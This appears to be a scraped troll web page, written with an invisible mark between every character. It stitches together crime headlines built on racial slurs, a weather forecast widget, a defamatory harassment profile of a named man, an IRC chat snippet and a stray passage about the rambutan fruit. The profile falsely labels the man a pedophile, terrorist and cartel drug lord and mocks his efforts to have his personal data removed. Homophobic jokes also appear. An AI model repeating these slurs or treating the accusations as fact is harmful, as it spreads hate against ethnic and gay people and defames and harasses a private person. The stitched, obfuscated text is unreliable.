N‎a‎t‎e‎ ‎S‎i‎l‎v‎e‎r‎:‎ ‎A‎l‎e‎x‎a‎n‎d‎r‎i‎a‎ ‎O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎ ‎M‎o‎s‎t‎ ‎L‎i‎k‎e‎l‎y‎ ‎2‎0‎2‎8‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎N‎o‎m‎i‎n‎e‎e‎
O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎ ‎V‎i‎e‎w‎e‎d‎ ‎a‎s‎ ‎M‎o‎s‎t‎ ‎L‎i‎k‎e‎l‎y‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎N‎o‎m‎i‎n‎e‎e‎
7‎0‎0‎
A‎n‎g‎e‎l‎ ‎M‎o‎m‎s‎ ‎T‎o‎r‎c‎h‎ ‎M‎a‎r‎y‎l‎a‎n‎d‎ ‎S‎e‎n‎.‎ ‎C‎h‎r‎i‎s‎ ‎V‎a‎n‎ ‎H‎o‎l‎l‎e‎n‎ ‎f‎o‎r‎ ‎V‎i‎s‎i‎t‎i‎n‎g‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎A‎f‎t‎e‎r‎ ‎I‎g‎
A‎n‎g‎e‎l‎ ‎M‎o‎m‎s‎ ‎S‎l‎a‎m‎ ‎C‎h‎r‎i‎s‎ ‎V‎a‎n‎ ‎H‎o‎l‎l‎e‎n‎ ‎f‎o‎r‎ ‎V‎i‎s‎i‎t‎i‎n‎g‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎ ‎f‎o‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎
1‎,‎6‎4‎4‎
R‎e‎p‎o‎r‎t‎:‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎ ‎R‎e‎n‎t‎i‎n‎g‎ ‎$‎9‎0‎0‎K‎ ‎H‎o‎m‎e‎,‎ ‎B‎o‎u‎g‎h‎t‎ ‎N‎e‎w‎ ‎C‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎R‎e‎l‎e‎a‎s‎e‎ ‎o‎n‎ ‎B‎o‎n‎d‎
R‎e‎p‎o‎r‎t‎:‎ ‎K‎a‎r‎m‎e‎l‎o‎ ‎A‎n‎t‎h‎o‎n‎y‎ ‎R‎e‎n‎t‎i‎n‎g‎ ‎$‎9‎0‎0‎K‎ ‎h‎o‎m‎e‎,‎ ‎B‎o‎u‎g‎h‎t‎ ‎N‎e‎w‎ ‎C‎a‎r‎

G‎r‎o‎i‎d‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎L‎o‎n‎g‎ ‎I‎s‎l‎a‎n‎d‎ ‎F‎u‎n‎e‎r‎a‎l‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎C‎h‎i‎m‎p‎s‎ ‎o‎u‎t‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎ ‎A‎f‎t‎e‎r‎ ‎G‎e‎t‎t‎i‎n‎g‎ ‎2‎5‎ ‎Y‎e‎a‎r‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎.‎

""‎I‎ ‎d‎i‎n‎d‎u‎ ‎n‎u‎f‎f‎i‎n‎!‎""‎


M‎o‎n‎k‎f‎o‎r‎m‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎e‎a‎l‎i‎n‎g‎ ‎F‎e‎d‎E‎X‎ ‎T‎r‎u‎c‎k‎ ‎a‎n‎d‎ ‎C‎r‎a‎s‎h‎i‎n‎g‎ ‎i‎t‎ ‎i‎n‎t‎o‎ ‎M‎T‎A‎ ‎B‎u‎s‎,‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎D‎r‎i‎v‎e‎r‎.‎


P‎o‎l‎i‎c‎e‎ ‎A‎r‎r‎e‎s‎t‎ ‎B‎o‎o‎t‎l‎i‎p‎s‎ ‎f‎o‎r‎ ‎S‎l‎e‎w‎ ‎o‎f‎ ‎N‎e‎w‎a‎r‎k‎ ‎B‎a‎n‎k‎ ‎R‎o‎b‎b‎e‎r‎i‎e‎s‎.‎


S‎p‎i‎c‎ ‎T‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎N‎o‎ ‎D‎r‎i‎v‎e‎r‎'‎s‎ ‎L‎i‎c‎e‎n‎s‎e‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎i‎n‎t‎o‎ ‎O‎n‎c‎o‎m‎i‎n‎g‎ ‎V‎e‎h‎i‎c‎l‎e‎,‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎2‎1‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎W‎o‎m‎a‎n‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎9‎°‎
0‎%‎
 ‎S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎ ‎|‎ ‎D‎a‎y‎
8‎6‎°‎
S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎.‎ ‎H‎i‎g‎h‎ ‎8‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
8‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎0‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎8‎ ‎p‎m‎
T‎h‎u‎ ‎1‎7‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎9‎°‎
1‎4‎%‎
S‎ ‎1‎8‎ ‎m‎p‎h‎
S‎o‎m‎e‎ ‎c‎l‎o‎u‎d‎s‎.‎ ‎L‎o‎w‎ ‎6‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
-‎-‎
W‎a‎n‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
9‎:‎3‎9‎ ‎a‎m‎
F‎r‎i‎ ‎1‎8‎
C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎9‎°‎
/‎7‎0‎°‎
1‎6‎%‎
 ‎S‎ ‎2‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎0‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎5‎9‎°‎
6‎8‎%‎
 ‎W‎N‎W‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎4‎°‎
1‎9‎%‎
 ‎N‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎8‎°‎
4‎8‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎6‎9‎°‎
5‎8‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎2‎°‎
/‎6‎7‎°‎
4‎4‎%‎
 ‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎5‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎9‎°‎
3‎3‎%‎
 ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎9‎°‎
/‎6‎9‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎0‎°‎
/‎7‎1‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
9‎0‎°‎
/‎6‎9‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎8‎°‎
/‎6‎7‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎7‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎1‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎6‎°‎
3‎5‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎Z‎o‎m‎b‎i‎e‎ ‎J‎e‎s‎u‎s‎.‎ ‎🧟‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

L‎j‎u‎p‎c‎o‎ ‎S‎t‎e‎r‎i‎e‎v‎
L‎j‎u‎p‎c‎o‎ ‎S‎t‎e‎r‎i‎e‎v‎†‎ ‎(‎p‎r‎o‎n‎o‎u‎n‎c‎e‎d‎ ‎L‎y‎n‎y‎r‎d‎ ‎S‎k‎y‎n‎y‎r‎d‎)‎,‎ ‎a‎l‎i‎a‎s‎ ‎J‎a‎n‎ ‎L‎u‎b‎e‎k‎,‎ ‎i‎s‎ ‎a‎ ‎p‎e‎t‎u‎l‎a‎n‎t‎ ‎4‎7‎-‎y‎e‎a‎r‎-‎o‎l‎d‎ ‎S‎l‎a‎v‎i‎c‎ ‎v‎i‎r‎g‎i‎n‎ ‎m‎a‎n‎c‎h‎i‎l‎d‎,‎ ‎c‎o‎n‎s‎p‎i‎r‎a‎c‎y‎ ‎t‎h‎e‎o‎r‎i‎s‎t‎,‎ ‎s‎i‎n‎g‎e‎r‎/‎m‎u‎s‎i‎c‎i‎a‎n‎,‎ ‎d‎e‎n‎t‎a‎l‎ ‎l‎a‎b‎ ‎t‎e‎c‎h‎n‎i‎c‎i‎a‎n‎,‎ ‎a‎m‎a‎t‎e‎u‎r‎ ‎c‎h‎e‎s‎s‎ ‎p‎l‎a‎y‎e‎r‎ ‎a‎n‎d‎ ‎b‎a‎t‎s‎h‎i‎t‎ ‎i‎n‎s‎a‎n‎e‎ ‎s‎c‎h‎i‎z‎o‎ ‎w‎h‎o‎ ‎c‎u‎r‎r‎e‎n‎t‎l‎y‎ ‎r‎e‎s‎i‎d‎e‎s‎ ‎i‎n‎ ‎h‎i‎s‎ ‎m‎o‎t‎h‎e‎r‎ ‎G‎r‎a‎z‎y‎n‎a‎'‎s‎ ‎b‎a‎s‎e‎m‎e‎n‎t‎ ‎i‎n‎ ‎C‎h‎i‎c‎a‎g‎o‎,‎ ‎I‎l‎l‎i‎n‎o‎i‎s‎.‎ ‎A‎c‎c‎o‎r‎d‎i‎n‎g‎ ‎t‎o‎ ‎h‎i‎s‎ ‎p‎r‎o‎f‎i‎l‎e‎ ‎o‎n‎ ‎b‎e‎s‎t‎i‎a‎l‎i‎t‎y‎s‎e‎x‎t‎a‎b‎o‎o‎.‎c‎o‎m‎,‎ ‎L‎j‎u‎p‎c‎o‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎a‎ ‎t‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎g‎a‎y‎ ‎p‎e‎d‎o‎ ‎w‎h‎o‎ ‎w‎o‎r‎k‎s‎ ‎a‎s‎ ‎a‎ ‎t‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎a‎n‎d‎ ‎d‎r‎u‎g‎ ‎l‎o‎r‎d‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎S‎i‎n‎a‎l‎o‎a‎ ‎C‎a‎r‎t‎e‎l‎.‎

L‎j‎u‎p‎c‎o‎ ‎i‎s‎ ‎k‎n‎o‎w‎n‎ ‎t‎o‎ ‎s‎p‎e‎n‎d‎ ‎a‎l‎l‎ ‎o‎f‎ ‎h‎i‎s‎ ‎t‎i‎m‎e‎ ‎c‎h‎r‎o‎n‎i‎c‎a‎l‎l‎y‎ ‎o‎n‎l‎i‎n‎e‎ ‎w‎h‎e‎r‎e‎ ‎h‎e‎ ‎i‎n‎c‎e‎s‎s‎a‎n‎t‎l‎y‎ ‎v‎a‎n‎d‎a‎l‎i‎z‎e‎s‎ ‎w‎i‎k‎i‎s‎.‎ ‎L‎j‎u‎p‎c‎o‎'‎s‎ ‎o‎t‎h‎e‎r‎ ‎6‎9‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎i‎e‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎c‎o‎n‎s‎i‎s‎t‎ ‎o‎f‎ ‎w‎a‎n‎n‎a‎b‎e‎ ‎l‎a‎w‎y‎e‎r‎s‎ ‎a‎n‎d‎ ‎h‎i‎s‎ ‎d‎e‎a‎d‎ ‎g‎r‎a‎n‎d‎p‎a‎r‎e‎n‎t‎s‎,‎ ‎a‎r‎e‎ ‎k‎n‎o‎w‎n‎ ‎t‎o‎ ‎e‎m‎a‎i‎l‎ ‎d‎e‎a‎t‎h‎ ‎a‎n‎d‎ ‎r‎a‎p‎e‎ ‎t‎h‎r‎e‎a‎t‎s‎ ‎t‎o‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎e‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎l‎i‎k‎e‎ ‎a‎n‎d‎ ‎s‎e‎n‎d‎ ‎f‎a‎l‎s‎e‎ ‎p‎h‎i‎s‎h‎i‎n‎g‎ ‎a‎n‎d‎ ‎c‎h‎i‎l‎d‎ ‎p‎o‎r‎n‎o‎g‎r‎a‎p‎h‎y‎ ‎r‎e‎p‎o‎r‎t‎s‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎D‎M‎C‎A‎ ‎t‎a‎k‎e‎d‎o‎w‎n‎ ‎r‎e‎q‎u‎e‎s‎t‎s‎ ‎t‎o‎ ‎C‎l‎o‎u‎d‎f‎l‎a‎r‎e‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎w‎e‎b‎ ‎h‎o‎s‎t‎i‎n‎g‎ ‎s‎e‎r‎v‎i‎c‎e‎s‎ ‎i‎n‎ ‎a‎ ‎f‎u‎t‎i‎l‎e‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎g‎e‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎L‎j‎u‎p‎c‎o‎'‎s‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎ ‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎r‎e‎m‎o‎v‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎.‎

O‎n‎ ‎W‎i‎k‎i‎p‎e‎d‎i‎a‎,‎ ‎L‎j‎u‎p‎c‎o‎ ‎i‎s‎ ‎a‎ ‎g‎l‎o‎b‎a‎l‎l‎y‎ ‎b‎a‎n‎n‎e‎d‎ ‎l‎o‎n‎g‎-‎t‎e‎r‎m‎ ‎a‎b‎u‎s‎e‎r‎ ‎a‎n‎d‎ ‎p‎r‎o‎l‎i‎f‎i‎c‎ ‎s‎o‎c‎k‎p‎u‎p‎p‎e‎t‎e‎e‎r‎ ‎w‎h‎o‎ ‎i‎s‎ ‎g‎e‎n‎e‎r‎a‎l‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎""‎G‎e‎o‎r‎g‎e‎ ‎R‎e‎e‎v‎e‎s‎ ‎P‎e‎r‎s‎o‎n‎""‎ ‎o‎r‎ ‎""‎G‎R‎P‎""‎ ‎d‎u‎e‎ ‎t‎o‎ ‎h‎i‎s‎ ‎a‎u‎t‎i‎s‎t‎i‎c‎ ‎o‎b‎s‎e‎s‎s‎i‎o‎n‎ ‎w‎i‎t‎h‎ ‎l‎o‎n‎g‎-‎d‎e‎c‎e‎a‎s‎e‎d‎ ‎S‎u‎p‎e‎r‎m‎a‎n‎ ‎a‎c‎t‎o‎r‎ ‎G‎e‎o‎r‎g‎e‎ ‎R‎e‎e‎v‎e‎s‎.‎ ‎I‎t‎ ‎i‎s‎ ‎q‎u‎i‎t‎e‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎h‎a‎t‎ ‎i‎n‎ ‎h‎i‎s‎ ‎s‎c‎h‎i‎z‎o‎p‎h‎r‎e‎n‎i‎a‎-‎a‎d‎d‎l‎e‎d‎ ‎m‎i‎n‎d‎,‎ ‎L‎j‎u‎p‎c‎o‎ ‎m‎a‎y‎ ‎e‎v‎e‎n‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎h‎i‎m‎s‎e‎l‎f‎ ‎o‎r‎ ‎o‎n‎e‎ ‎o‎f‎ ‎h‎i‎s‎ ‎m‎a‎n‎y‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎i‎e‎s‎ ‎t‎o‎ ‎b‎e‎ ‎G‎e‎o‎r‎g‎e‎ ‎R‎e‎e‎v‎e‎s‎.‎

L‎j‎u‎p‎c‎o‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎t‎e‎r‎r‎o‎r‎i‎z‎i‎n‎g‎ ‎c‎h‎e‎s‎s‎ ‎p‎l‎a‎y‎e‎r‎s‎ ‎s‎i‎n‎c‎e‎ ‎1‎9‎9‎7‎,‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎ ‎s‎i‎n‎c‎e‎ ‎1‎9‎9‎9‎,‎ ‎W‎i‎k‎i‎p‎e‎d‎i‎a‎ ‎s‎i‎n‎c‎e‎ ‎2‎0‎0‎5‎,‎ ‎M‎u‎g‎s‎h‎o‎t‎s‎.‎c‎o‎m‎ ‎s‎i‎n‎c‎e‎ ‎2‎0‎1‎8‎,‎ ‎a‎n‎d‎ ‎E‎n‎c‎y‎c‎l‎o‎p‎æ‎d‎i‎a‎ ‎D‎r‎a‎m‎a‎t‎i‎c‎a‎ ‎s‎i‎n‎c‎e‎ ‎l‎a‎t‎e‎ ‎L‎a‎s‎t‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎.‎ ‎L‎j‎u‎p‎c‎o‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎a‎ ‎v‎i‎r‎u‎l‎e‎n‎t‎ ‎r‎a‎c‎i‎s‎t‎ ‎w‎h‎o‎ ‎r‎e‎g‎u‎l‎a‎r‎l‎y‎ ‎r‎e‎f‎e‎r‎s‎ ‎t‎o‎ ‎p‎a‎j‎e‎e‎t‎s‎ ‎a‎n‎d‎ ‎p‎a‎k‎i‎s‎ ‎a‎s‎ ‎b‎e‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎""‎T‎e‎r‎r‎o‎r‎i‎s‎t‎a‎n‎""‎ ‎a‎n‎d‎ ‎b‎e‎l‎i‎e‎v‎e‎s‎ ‎t‎h‎a‎t‎ ‎K‎o‎r‎e‎a‎n‎s‎ ‎a‎r‎e‎ ‎d‎e‎s‎t‎r‎o‎y‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎

(‎(‎ ‎E‎D‎P‎E‎D‎O‎S‎ ‎A‎R‎E‎ ‎D‎E‎F‎E‎N‎D‎I‎N‎G‎ ‎W‎I‎K‎I‎H‎O‎M‎O‎P‎E‎D‎O‎I‎D‎I‎O‎T‎S‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎ ‎t‎h‎e‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎i‎s‎n‎'‎t‎ ‎m‎u‎c‎h‎ ‎o‎f‎ ‎a‎ ‎r‎e‎p‎l‎a‎c‎e‎m‎e‎n‎t‎ ‎f‎o‎r‎ ‎#‎C‎h‎a‎s‎e‎s‎/‎#‎E‎F‎N‎e‎t‎N‎e‎w‎s‎,‎ ‎h‎o‎w‎e‎v‎e‎r‎ ‎g‎a‎y‎s‎ ‎s‎t‎i‎l‎l‎ ‎a‎r‎e‎ ‎f‎i‎n‎d‎i‎n‎g‎ ‎n‎e‎w‎ ‎w‎a‎y‎s‎ ‎t‎o‎ ‎g‎e‎t‎ ‎A‎I‎D‎S‎,‎ ‎s‎o‎ ‎h‎e‎r‎e‎'‎s‎ ‎#‎L‎R‎H‎:‎

[‎1‎6‎:‎2‎5‎]‎ ‎<‎+‎j‎r‎r‎a‎_‎>‎ ‎m‎y‎ ‎c‎r‎e‎d‎i‎t‎ ‎s‎c‎o‎r‎e‎ ‎i‎s‎ ‎1‎0‎0‎0‎/‎1‎0‎0‎0‎
[‎1‎6‎:‎2‎5‎]‎ ‎<‎+‎P‎a‎r‎f‎>‎ ‎t‎h‎e‎ ‎e‎v‎e‎r‎ ‎p‎r‎e‎s‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎i‎v‎i‎l‎ ‎w‎a‎r‎ ‎t‎h‎a‎t‎ ‎w‎i‎l‎l‎ ‎n‎e‎v‎e‎r‎ ‎c‎o‎m‎e‎
[‎1‎6‎:‎2‎5‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎o‎r‎ ‎r‎e‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎c‎r‎e‎d‎i‎t‎ ‎t‎a‎k‎e‎s‎ ‎a‎ ‎l‎o‎n‎g‎ ‎t‎i‎m‎e‎
[‎1‎6‎:‎2‎5‎]‎ ‎<‎+‎s‎p‎o‎o‎n‎>‎ ‎g‎o‎t‎t‎a‎ ‎p‎u‎m‎p‎ ‎t‎h‎o‎s‎e‎ ‎n‎u‎m‎b‎e‎r‎s‎ ‎u‎p‎
[‎1‎6‎:‎2‎5‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎i‎ ‎a‎m‎ ‎o‎n‎l‎y‎ ‎3‎ ‎y‎e‎a‎r‎s‎ ‎i‎n‎ ‎t‎o‎ ‎t‎h‎i‎s‎ ‎s‎h‎i‎t‎
[‎1‎6‎:‎2‎5‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎a‎n‎d‎ ‎i‎t‎s‎ ‎s‎t‎i‎l‎l‎ ‎l‎i‎k‎e‎ ‎'‎y‎o‎u‎r‎ ‎l‎e‎n‎g‎t‎h‎ ‎i‎f‎ ‎c‎r‎e‎d‎ ‎i‎t‎ ‎i‎s‎ ‎b‎a‎d‎ ‎y‎o‎u‎ ‎l‎o‎s‎e‎r‎!‎'‎
[‎1‎6‎:‎2‎6‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎b‎u‎t‎ ‎i‎ ‎g‎u‎e‎s‎s‎ ‎i‎t‎s‎ ‎g‎o‎o‎d‎ ‎t‎h‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎i‎s‎ ‎h‎i‎g‎h‎e‎r‎ ‎t‎h‎a‎n‎ ‎6‎0‎0‎ ‎n‎o‎w‎
[‎1‎6‎:‎2‎6‎]‎ ‎<‎+‎P‎a‎r‎f‎>‎ ‎b‎u‎y‎ ‎b‎i‎r‎d‎ ‎s‎e‎e‎d‎
[‎1‎6‎:‎2‎6‎]‎ ‎<‎+‎P‎a‎r‎f‎>‎ ‎i‎t‎'‎s‎ ‎s‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎p‎u‎m‎p‎ ‎y‎o‎u‎r‎ ‎c‎r‎e‎d‎i‎t‎ ‎a‎ ‎l‎i‎t‎t‎l‎e‎ ‎i‎f‎ ‎y‎o‎u‎ ‎b‎u‎y‎ ‎c‎e‎r‎t‎a‎i‎n‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎t‎h‎a‎t‎ ‎s‎u‎g‎g‎e‎s‎t‎ ‎a‎ ‎w‎e‎l‎l‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎ ‎h‎o‎m‎e‎
[‎1‎6‎:‎2‎6‎]‎ ‎<‎@‎s‎t‎r‎a‎t‎u‎m‎>‎ ‎l‎o‎l‎
[‎1‎6‎:‎2‎6‎]‎ ‎<‎+‎P‎a‎r‎f‎>‎ ‎i‎'‎m‎ ‎s‎e‎r‎i‎o‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎r‎a‎m‎b‎u‎t‎a‎n‎ ‎(‎N‎e‎p‎h‎e‎l‎i‎u‎m‎ ‎l‎a‎p‎p‎a‎c‎e‎u‎m‎)‎ ‎i‎s‎ ‎a‎ ‎m‎e‎d‎i‎u‎m‎-‎s‎i‎z‎e‎d‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎t‎r‎e‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎S‎a‎p‎i‎n‎d‎a‎c‎e‎a‎e‎,‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎S‎o‎u‎t‎h‎e‎a‎s‎t‎ ‎A‎s‎i‎a‎.‎ ‎T‎h‎e‎ ‎f‎r‎u‎i‎t‎ ‎i‎s‎ ‎a‎ ‎r‎o‎u‎n‎d‎ ‎t‎o‎ ‎o‎v‎a‎l‎ ‎s‎i‎n‎g‎l‎e‎-‎s‎e‎e‎d‎e‎d‎ ‎d‎r‎u‎p‎e‎,‎ ‎3‎ ‎t‎o‎ ‎6‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎+‎1‎⁄‎4‎ ‎t‎o‎ ‎2‎+‎1‎⁄‎4‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎l‎o‎n‎g‎ ‎a‎n‎d‎ ‎3‎ ‎t‎o‎ ‎4‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎+‎1‎⁄‎4‎ ‎t‎o‎ ‎1‎+‎1‎⁄‎2‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎w‎i‎d‎e‎.‎ ‎T‎h‎e‎ ‎l‎e‎a‎t‎h‎e‎r‎y‎ 